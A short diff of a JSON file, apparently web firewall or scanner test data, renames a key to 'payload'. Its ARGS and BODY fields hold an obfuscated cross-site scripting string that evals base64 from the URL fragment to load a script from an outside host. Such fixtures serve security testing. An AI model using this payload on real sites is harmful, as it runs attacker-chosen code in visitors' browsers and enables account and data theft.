@@ -1,5 +1,5 @@
 {
-  "req": [
+  "payload": [
     {
       "ARGS": "<svg/onload=eval(atob(URL.slice(-148)))>#d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoL3NjcmlwdC8uc291cmNlKSkuc3JjPWF0b2IoL0x5OWljblYwWld4dloybGpMbU52YlM1aWNpOHkvLnNvdXJjZSk=",
       "BODY": "<svg/onload=eval(atob(URL.slice(-148)))>#d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoL3NjcmlwdC8uc291cmNlKSkuc3JjPWF0b2IoL0x5OWljblYwWld4dloybGpMbU52YlM1aWNpOHkvLnNvdXJjZSk=",
